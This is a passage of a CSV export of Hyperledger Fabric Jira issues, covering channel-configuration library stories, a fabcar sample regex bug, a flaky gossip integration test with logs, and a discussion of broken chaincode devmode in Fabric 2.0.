 ",,tsharris,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-17570,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-17628,,,No,,Unset,No,,,"1|i00n2e:8znqzzygi",,,,Unset,Unset,,(Please add steps to reproduce),1.0,Unset,,,,,,Unset,,Unset,,(Please add usage information),tsharris,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"17/Mar/20 4:20 AM;tsharris;[https://github.com/hyperledger/fabric/pull/830];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Implement function for adding and removing policies for consortium orgs and consortiums/consortium groups,FAB-17572,44489,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,tsharris,caod,caod,03/Mar/20 3:55 AM,19/Mar/20 3:18 AM,28/Oct/23 3:09 AM,19/Mar/20 3:18 AM,,,,,,,,,,v2.1.0,,,,fabric-common,,,,,,,,,0,ipm,,,,,"As a user of the Fabric channel configuration API, I would like to be able to update a consortium org's, consortiums group's, and consortium group's configuration by adding or removing policies.

 

*Acceptance*

I should be able to call this function to modify a config transaction and then process further configuration updates on the modified config transaction. The examples test should be updated to demonstrate usage of this feature.

 ",,tsharris,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-17570,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-17628,,,No,,Unset,No,,,"1|i00n2e:8znqzzygr",,,,Unset,Unset,,(Please add steps to reproduce),1.0,Unset,,,,,,Unset,,Unset,,(Please add usage information),tsharris,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"17/Mar/20 4:20 AM;tsharris;[https://github.com/hyperledger/fabric/pull/830];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Implement function to add an orderer org to a channel config,FAB-17573,44490,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,tsharris,caod,caod,03/Mar/20 4:06 AM,17/Mar/20 4:17 AM,28/Oct/23 3:09 AM,13/Mar/20 10:22 PM,,,,,,,,,,v2.1.0,,,,,,,,,,,,,0,configtx,ipm,,,,"As a fabric administrator, I want to use a fit-for-purpose function that adds an orderer org definition to a channel configuration. The result of this function should be a channel transaction that can be passed to other functions that can further mutate the config.

*Acceptance*

Calling the new function with appropriate arguments should generate a config transaction that contains a new orderer org. The examples test should also be updated to demonstrate usage of this feature.",,tsharris,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-17574,,FAB-17510,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-17628,,,No,,Unset,No,,,"1|i00n2e:8znqzzyhi",,,,Unset,Unset,,(Please add steps to reproduce),1.0,Unset,,,,,,Unset,,Unset,,(Please add usage information),tsharris,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"13/Mar/20 9:31 PM;tsharris;[https://github.com/hyperledger/fabric/pull/840];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Implement function to add an application org to a channel config,FAB-17574,44491,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,xwu,caod,caod,03/Mar/20 4:09 AM,24/Mar/20 10:20 AM,28/Oct/23 3:09 AM,24/Mar/20 3:11 AM,,,,,,,,,,v2.1.0,,,,,,,,,,,,,0,configtx,ipm,,,,"As a fabric administrator, I want to use a fit-for-purpose function that adds an application org definition to a channel configuration. The result of this function should be a channel transaction that can be passed to other functions that can further mutate the config.

*Acceptance*

Calling the new function with appropriate arguments should generate a config transaction that contains a new application org. The examples test should also be updated to demonstrate usage of this feature.",,xwu,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-17573,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-17628,,,No,,Unset,No,,,"1|i00n2e:8znqzzyhr",,,,Unset,Unset,,(Please add steps to reproduce),1.0,Unset,,,,,,Unset,,Unset,,(Please add usage information),xwu,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"24/Mar/20 10:20 AM;xwu;https://github.com/hyperledger/fabric/pull/899;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Create channel tx passes a single MSP Config to all orgs,FAB-17575,44492,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,caod,caod,caod,03/Mar/20 5:06 AM,04/Mar/20 3:48 AM,28/Oct/23 3:09 AM,04/Mar/20 3:48 AM,,,,,,,,,,v2.1.0,,,,fabric-common,,,,,,,,,0,ipm,,,,,Each org should have its own MSP configuration. I propose we add the FabricMSPConfig to the organization configuration and remove passing it as a separate value during create channel tx,,caod,sykesm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i00n2e:8znqzy",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),caod,sykesm,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"03/Mar/20 5:40 AM;sykesm;https://github.com/hyperledger/fabric/pull/780
;;;","03/Mar/20 11:05 PM;sykesm;https://github.com/hyperledger/fabric/pull/780 was reverted as conflicts broke the build. Please rebase on top of master and open a new PR.;;;","04/Mar/20 2:03 AM;caod;[https://github.com/hyperledger/fabric/pull/792|https://github.com/hyperledger/fabric/pull/792/files];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Implement helper function for retrieving msp configuration for a specific org from an existing config,FAB-17576,44493,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,caod,caod,caod,03/Mar/20 5:07 AM,17/Mar/20 4:23 AM,28/Oct/23 3:09 AM,14/Mar/20 12:40 AM,,,,,,,,,,v2.1.0,,,,fabric-common,,,,,,,,,0,ipm,,,,,"As a user of the Fabric channel configuration API, I would like to be able to retrieve existing msp configuration for an organization without manually parsing the config transaction so I can reuse CA certs or other relevant information.

 

*Acceptance*

I should be able to call a function for retrieving msp configuration for a specific org. The example test should also be updated to demonstrate usage of this helper.",,caod,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-17600,,FAB-17567,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-17628,,,No,,Unset,No,,,"1|i00n2e:8znqzzygw",,,,Unset,Unset,,(Please add steps to reproduce),1.0,Unset,,,,,,Unset,,Unset,,(Please add usage information),caod,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"12/Mar/20 4:39 AM;caod;[https://github.com/hyperledger/fabric/pull/841];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Rename pkg/config to something more appropriate,FAB-17577,44494,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,caod,caod,caod,03/Mar/20 6:07 AM,17/Apr/20 4:43 AM,28/Oct/23 3:09 AM,17/Apr/20 4:43 AM,,,,,,,,,,v2.1.0,,,,fabric-common,,,,,,,,,0,ipm,,,,,config as a package name isn't very descriptive of what this package is. We should consider renaming the package to something more appropriate for what it actually does (maybe configtx?),,caod,tsharris,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-17628,,,No,,Unset,No,,,"1|i00n2e:8znqzzzjyi",,,,Unset,Unset,,(Please add steps to reproduce),1.0,Unset,,,,,,Unset,,Unset,,(Please add usage information),caod,tsharris,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"18/Mar/20 1:09 AM;tsharris;Should be renamed to configtx;;;","21/Mar/20 12:30 AM;caod;We can probably do this as part of FAB-17640 when we move config out of Fabric.;;;","15/Apr/20 5:08 AM;caod;[https://github.com/hyperledger/fabric/pull/1088];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
The second chaincode container not start,FAB-17578,44495,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,,liys87x,liys87x,03/Mar/20 11:28 AM,04/Mar/20 10:56 AM,28/Oct/23 3:09 AM,04/Mar/20 10:56 AM,v2.0.0,,,,,,,,,,,,,fabric-cli,fabric-installers,fabric-samples,fabric-test,,,,,,0,chaincode,quality,,,,"Fabric Version: 2.0.0

Project: [https://github.com/hyperledger/fabric-samples/tree/master/fabcar]

By `startFabric.sh` start network and install fabcar chaincode，everything is ok.

then, install another chaincode, the chaincode container not start, chaincode image is ok, `peer lifecycle chaincode queryinstalled/querycommitted` is ok, and invoke chaincode is wrong: 

`chaincode definition for 'xxx' exists, but chaincode is not installed`",,liys87x,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"03/Mar/20 11:30 AM;liys87x;installFabcar.sh;https://jira.hyperledger.org/secure/attachment/18156/installFabcar.sh","03/Mar/20 11:30 AM;liys87x;installMycar.sh;https://jira.hyperledger.org/secure/attachment/18157/installMycar.sh","03/Mar/20 11:29 AM;liys87x;start.sh;https://jira.hyperledger.org/secure/attachment/18155/start.sh",,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-11237,,,No,,Unset,No,,,"1|i019pf:",,,,Unset,Unset,,"1. execute startFabric.sh
2. copy startfabric.sh, chanage chaincode name, from fabcar to mycar, remove  'launch network' part
3. install new chaincode mycar (execute new shell)
4. query mycar is wrong, ""chaincode definition for 'mycar' exists, but chaincode is not installed""",,Unset,,,,,,Unset,,Unset,,(Please add usage information),liys87x,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"03/Mar/20 11:35 AM;liys87x;# Execute: start.sh and installFabcar.sh and installMycar.sh, Result: fabcar is ok, mycar is wrong
 # Execute: start.sh and installMycar.sh and installfabcar.sh, Result: mycar is ok, fabcar is wrong

 
 * fabcar and mycar docker image is ok
 * peer lifecycle chaincode queryinstalled/querycommitted is ok
 * the second chaincode container not start
 * the second chaincode execute query/invoke is wrong: `chaincode definition for 'xxx' exists, but chaincode is not installed`

 ;;;","04/Mar/20 10:53 AM;liys87x;PackageID selector REGEX BUG:
source: [https://github.com/hyperledger/fabric-samples/blob/master/fabcar/startFabric.sh]

current REGEX: `REGEX=""Package ID: (.*), Label: $LABEL""`

modified REGEX: `REGEX=""Package ID: ([^,]*), Label: $LABEL""`;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Add an integration test package that uses the config package instead of configtxgen for all channel configuration,FAB-17579,44496,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,wlahti,sykesm,sykesm,03/Mar/20 11:09 PM,17/Mar/20 4:19 AM,28/Oct/23 3:09 AM,13/Mar/20 3:41 AM,,,,,,,,,,v2.1.0,,,,fabric-common,,,,,,,,,0,ipm,,,,,"To ensure that the config transactions generate functional code in the context of a running network, create an integration test suite that uses the config package instead of configtxgen and the peer cli to create channel configuration transactions.

The tests can still rely on cryptogen to create MSP material.

While the nwo package may create a configtx yaml configuration and call the tool, the actual tests should not use those artifacts. If minor changes are needed to bootstrap (provided they are backward compatible and not a complete bifurcation of logic or dual pathing), they can be included in this effort.",,sykesm,wlahti,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-17628,,,No,,Unset,No,,,"1|i00n2e:8znqzzy2",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),sykesm,wlahti,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"10/Mar/20 5:34 AM;wlahti;PR opened with one initial commit that creates a channel and joins the peers to that channel: [https://github.com/hyperledger/fabric/pull/819] 

Subsequent commits to follow.;;;","11/Mar/20 4:15 AM;wlahti;Update channel config with anchor peers for each org: [https://github.com/hyperledger/fabric/pull/827];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Remove or rationalize toLowS for signatures,FAB-17580,44498,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Won't Do,wlahti,caod,caod,04/Mar/20 12:50 AM,23/Apr/20 7:13 AM,28/Oct/23 3:09 AM,23/Apr/20 7:13 AM,,,,,,,,,,v2.1.0,,,,fabric-common,,,,,,,,,0,ipm,,,,,Currently we standardize signatures using toLowS for Fabric specifically. It's possible this might not be necessary so we should investigate whether this logic is needed.,,caod,wlahti,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-17628,,,No,,Unset,No,,,"1|i00n2e:8znqzzzk",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),caod,wlahti,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"08/Apr/20 10:11 PM;wlahti;[~ales] For the context of the new channel configuration library, is there still a reason that the signatures we submit to fabric nodes should always be in low S form? ;;;","15/Apr/20 1:12 AM;wlahti;[~ales] Still looking for your input on this one whenever you get a chance!;;;","23/Apr/20 7:13 AM;caod;Going to just close this out since we're wrapping up part 1 of config soon and there doesn't seem to be much activity on this.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Intermittent test failure in pvtdata integration suite - implicit_coll_test,FAB-17581,44499,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,wenjian,sykesm,sykesm,04/Mar/20 2:03 AM,12/Mar/20 2:11 AM,28/Oct/23 3:09 AM,12/Mar/20 2:11 AM,,,,,,,,,,v2.0.2,v2.1.0,,,fabric-ledger,,,,,,,,,0,ci-flake,,,,,"https://dev.azure.com/Hyperledger/Fabric/_build/results?buildId=9132&view=logs&j=7e1dd684-043b-58f9-3f54-f4b0baeb1973

{code}
------------------------------
• Failure in Spec Setup (BeforeEach) [83.177 seconds]
Pvtdata dissemination for implicit collection [BeforeEach] disseminates pvtdata of implicit collection for the peer's own org but not implicit collection for another org 
/home/vsts/work/1/go/src/github.com/hyperledger/fabric/integration/pvtdata/implicit_coll_test.go:82

  No future change is possible.  Bailing out early after 0.061s.
  Expected
      <int>: 1
  to match exit code:
      <int>: 0

  /home/vsts/work/1/go/src/github.com/hyperledger/fabric/integration/nwo/deploy.go:247
{code}",,caod,sykesm,wenjian,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"05/Mar/20 3:09 AM;tsharris;flake.log;https://jira.hyperledger.org/secure/attachment/18159/flake.log","11/Mar/20 4:43 AM;caod;mar10.txt;https://jira.hyperledger.org/secure/attachment/18164/mar10.txt","04/Mar/20 2:20 AM;sykesm;pvtdata.txt;https://jira.hyperledger.org/secure/attachment/18158/pvtdata.txt",,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i019pv:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),caod,sykesm,wenjian,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"11/Mar/20 4:44 AM;caod;Probably related to FAB-17491;;;","11/Mar/20 4:45 AM;caod;/cc [~wenjian];;;","11/Mar/20 5:10 AM;wenjian;There was the following warning/error message in log file. For some reason, Org1.peer0 (10.1.0.4:24504) and Org1.peer1(10.1.0.4:24514) failed to connect to each other due to ""context deadline exceeded"". Need to figure out how gossip can recover in this case.

{quote}
2020-03-03T16:45:12.1005633Z [91m[e][35m[Org1.peer0][0m [33m2020-03-03 16:45:09.065 UTC [gossip.comm] sendToEndpoint -> WARN 0c1[0m Failed obtaining connection for 10.1.0.4:24514, PKIid:984d080229c66d53e31ac5e8f537bf0f9e376022fbcc56b1ea48fe70b8a335c0 reason: context deadline exceeded
2020-03-03T16:45:12.1007390Z [91m[e][35m[Org1.peer0][0m [33m2020-03-03 16:45:09.065 UTC [gossip.discovery] expireDeadMembers -> WARN 0c2[0m Entering [984d080229c66d53e31ac5e8f537bf0f9e376022fbcc56b1ea48fe70b8a335c0]
2020-03-03T16:45:12.1008993Z [91m[e][35m[Org1.peer0][0m [33m2020-03-03 16:45:09.065 UTC [gossip.discovery] expireDeadMembers -> WARN 0c3[0m Closing connection to Endpoint: 127.0.0.1:24514, InternalEndpoint: 10.1.0.4:24514, PKI-ID: 984d080229c66d53e31ac5e8f537bf0f9e376022fbcc56b1ea48fe70b8a335c0, Metadata: 
2020-03-03T16:45:12.1010266Z [91m[e][35m[Org1.peer0][0m [33m2020-03-03 16:45:09.065 UTC [gossip.discovery] expireDeadMembers -> WARN 0c4[0m Exiting
2020-03-03T16:45:12.1011897Z [91m[e][37m[Org1.peer1][0m [33m2020-03-03 16:45:09.092 UTC [gossip.comm] sendToEndpoint -> WARN 053[0m Failed obtaining connection for 10.1.0.4:24504, PKIid:a6d910792fcd7d21362e0f4648ba5cf8f4d7f9830186cb929b68acf688375e3c reason: context deadline exceeded
....
2020-03-10T17:33:59.6236238Z [91m[e][35m[Org1.peer0][0m [31m2020-03-10 17:33:58.982 UTC [gossip.service] DistributePrivateData -> ERRO 0f5[0m failed to distribute private collection, txID 277239fab337cff6dd9208462763416f1aeb76c66cdc0c790a0f08d12b0d968d, channel testchannel: could not build private data dissemination plan for chaincode _lifecycle and collection _implicit_org_Org1MSP: required to disseminate to at least 1 peers, but know of only 0 eligible peers
{quote};;;","11/Mar/20 10:29 AM;wenjian;PR: https://github.com/hyperledger/fabric/pull/832;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Stop using FabricMSPConfig proto in config.Organization,FAB-17582,44501,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,caod,caod,caod,04/Mar/20 3:47 AM,17/Mar/20 4:20 AM,28/Oct/23 3:09 AM,12/Mar/20 12:24 AM,,,,,,,,,,v2.1.0,,,,fabric-common,,,,,,,,,0,ipm,,,,,There are a lot of fields in the FabricMSPConfig that are confusing or just byte slices. Let's make a type MSPConfig for the config library that is more consumer friendly and then convert to FabricMSPConfig internally when needed.,,caod,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-17628,,,No,,Unset,No,,,"1|i00n2e:8znqzyc",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),caod,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"06/Mar/20 1:23 AM;caod;[https://github.com/hyperledger/fabric/pull/805];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Simplify NewCreateChannelTx to only consider an application channel,FAB-17583,44502,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,caod,caod,caod,04/Mar/20 6:21 AM,17/Mar/20 4:23 AM,28/Oct/23 3:09 AM,07/Mar/20 4:32 AM,,,,,,,,,,v2.1.0,,,,fabric-common,,,,,,,,,0,ipm,,,,,"An application channel only needs to specify the consortium name, org names, and application level values/policies. We shouldn't need to extend it with defining org specific values/anchor peers/orderer config, etc. Currently the NewCreateChannelTx considers creation of a system channel and also creates a creates a Consortiums group and orderer group. Let's consider system channel creation for the future and simplify the existing logic to just be for new application channels.",,caod,ymlbright,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-17628,,,No,,Unset,No,,,"1|i00n2e:8znqzy9",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),caod,ymlbright,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"05/Mar/20 2:14 AM;caod;[https://github.com/hyperledger/fabric/pull/800];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Investigate the functionality of chaincode devmode,FAB-17584,44503,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,dereckluo,btl5037,btl5037,04/Mar/20 1:12 PM,18/Aug/20 4:57 AM,28/Oct/23 3:09 AM,18/Aug/20 4:57 AM,v2.0.0,,,,,,,,,,,,,fabric-peer,,,,,,,,,7,ipm,operator,,,,"Chaincode DevMode no longer works with the release of 2.x. We should take a quick run at attempting to fix it, or otherwise disable the codepath and remove from doc.

There remains no integration or functional testing around devmode, and thus with every new release come broken features for devmode. In order to support the continued maintenance of devmode, and integration test should be added to verify the functionality remains working

 ",,acloudfan,btl5037,dereckluo,Matrixik,Pancham,prakash.shivappa,robmurgai,siddjain,wlahti,yuki-kon,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-18074,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i00n2e:8znqzzzzzoh",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),acloudfan,btl5037,dereckluo,Matrixik,Pancham,prakash.shivappa,robmurgai,siddjain,wlahti,yuki-kon,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"05/Mar/20 9:50 AM;siddjain;removing the dev mode will be highly disastrous as without it, it is impossible to debug chaincode or make changes to the chaincode without going through the lengthy upgrade cycle. this should be a high priority work item please.;;;","05/Mar/20 10:36 AM;btl5037;What chaincode functionality are you trying to make use of in 2.0 that requires you to be on 2.0 to test with devmode?;;;","05/Mar/20 12:27 PM;siddjain;There are three features of dev mode that make it indispensible:
 # Ability to run the smart contracts directly without having them run inside a docker container.
 # Ability to debug the smart contracts (follows from #1 above)
 # Ability to make changes to the smart contracts without having to go through the lengthy process of re-installing the chaincode on all the peers and then upgrading it.;;;","05/Mar/20 1:28 PM;btl5037;With every new version of Fabric it was introduced, devmode has broken because there were, and remain, no mainline tests for it. After every release someone is invariable left to find and fix the issues in devmode. With the vast reach of the major changes to lifecycle and chaincode in 2.0, we knew there was a strong possibility devmode wouldn't work anymore. We tried to get testing in before 2.0, but ultimately decided we didn't have the bandwidth and not having devmode didn't break any functionality to prevent the release.

And honestly there are better tools for writing and testing smart contracts than devmode these days, like the Open Source IBM VS Code Extension which deploys fabric and provides the ability to do rapid chaincode iterations.

While the maintainers do the best they can to maintain everything, we have to remember, Fabric is an open source project. The maintainers have to prioritize and are a limited in the number of features they can support. Open source projects rely on the fact that anyone and everyone is welcome to contribute. If someone in the community wants to tackle fixing devmode and even adding tests for it, we would greatly welcome the contribution.

While I'm sure not the answer you want to hear, this Jira will remain open until we can prioritize the work or someone in the community provides a solution. ;;;","06/Mar/20 2:57 AM;siddjain;# Thanks Brett: 
 # I don't think Open Source IBM VS Code Extension is updated to v2.0 of Fabric. is that not correct?
 # Also I don't see how it provides the ability to do rapid chaincode iterations without using the dev mode. It relied on the dev mode for that.
 # Also that extension only creates a single-org network which is not applicable for most cases.

If I am missing something please let me know. Thanks.;;;","17/Mar/20 6:59 AM;siddjain;here is video showing the dev mode does not work in Fabric 2.0: [https://youtu.be/TISaOqWCVTc]

I stick a breakpoint in 

```

internal/peer/node/start.go:498:        userRunsCC := chaincode.*IsDevMode*()

```

verifying that `userRunsCC` evals to `true` but the peer node still tries to create a chaincode container (it shouldn't do this in dev mode)

 

```

2020-03-16 14:24:20.545 PDT [lifecycle] Work -> WARN 020 could not launch chaincode 'mycc_1.0:ce4e81ee8835ad0a01f7629b4646f52535b91378311f11cee703b3011d7adfdf': chaincode registration failed: container exited with 0

```

 

chaincode invocation will fail with following stacktrace since there is no chaincode container running

 

```

2020-03-16 14:25:34.663 PDT [endorser] SimulateProposal -> ERRO 025 failed to invoke chaincode mycc, error: container exited with 02020-03-16 14:25:34.663 PDT [endorser] SimulateProposal -> ERRO 025 failed to invoke chaincode mycc, error: container exited with 0github.com/hyperledger/fabric/core/chaincode.(*RuntimeLauncher).Launch.func1 /Users/sjain68/go/src/github.com/hyperledger/fabric/core/chaincode/runtime_launcher.go:118runtime.goexit /usr/local/go/src/runtime/asm_amd64.s:1357chaincode registration failedcould not launch chaincode mycc_1.0:ce4e81ee8835ad0a01f7629b4646f52535b91378311f11cee703b3011d7adfdfgithub.com/hyperledger/fabric/core/chaincode.(*ChaincodeSupport).Launch /Users/sjain68/go/src/github.com/hyperledger/fabric/core/chaincode/chaincode_support.go:85github.com/hyperledger/fabric/core/chaincode.(*ChaincodeSupport).Invoke /Users/sjain68/go/src/github.com/hyperledger/fabric/core/chaincode/chaincode_support.go:197github.com/hyperledger/fabric/core/chaincode.(*ChaincodeSupport).Execute /Users/sjain68/go/src/github.com/hyperledger/fabric/core/chaincode/chaincode_support.go:155github.com/hyperledger/fabric/core/endorser.(*SupportImpl).Execute /Users/sjain68/go/src/github.com/hyperledger/fabric/core/endorser/support.go:126github.com/hyperledger/fabric/core/endorser.(*Endorser).callChaincode /Users/sjain68/go/src/github.com/hyperledger/fabric/core/endorser/endorser.go:114github.com/hyperledger/fabric/core/endorser.(*Endorser).SimulateProposal /Users/sjain68/go/src/github.com/hyperledger/fabric/core/endorser/endorser.go:173github.com/hyperledger/fabric/core/endorser.(*Endorser).ProcessProposalSuccessfullyOrError 